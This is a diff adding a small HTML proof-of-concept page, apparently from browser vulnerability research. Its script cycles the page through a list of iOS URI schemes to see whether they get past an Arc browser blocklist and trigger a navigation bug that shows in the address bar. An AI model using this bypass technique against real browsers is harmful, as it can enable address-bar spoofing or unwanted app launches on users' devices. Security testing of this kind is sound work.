@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head><title>.</title></head>
+<body>
+<!--
+  BYPASS 5: Alternative URI schemes
+
+  If Arc blocklisted geo:/tel:/sms: specifically, these other iOS-registered
+  schemes might bypass the blocklist while still triggering the navigation
+  delegate bug.
+
+  Each scheme is tried with a delay between them.
+  Watch the address bar after each attempt.
+-->
+<script>
+  var schemes = [
+    // Apple Maps variations
+    "maps:?q=test",
+    "maps://maps.apple.com/?q=test",
+    "comgooglemaps://?q=test",
+
+    // Communication
+    "facetime:test@test.com",
+    "facetime-audio:test@test.com",
+
+    // App Store
+    "itms-apps://apps.apple.com",
+    "itms-appss://apps.apple.com",
+
+    // Calendar
+    "calshow:",
+
+    // Shortcuts
+    "shortcuts://",
+
+    // Apple data detectors (system-level)
+    "x-apple-data-detectors://",
+
+    // Music
+    "music://",
+    "itmss://",
+
+    // Mail
+    "mailto:test@test.com",
+    "message://",
+
+    // Safari-specific
+    "x-web-search://",
+
+    // Settings
+    "App-prefs:",
+    "prefs:",
+  ];
+
+  schemes.forEach(function(scheme, i) {
+    setTimeout(function() {
+      try {
+        window.location.href = scheme;
+      } catch(e) {}
+    }, i * 300);
+  });
+</script>
+</body>
+</html>
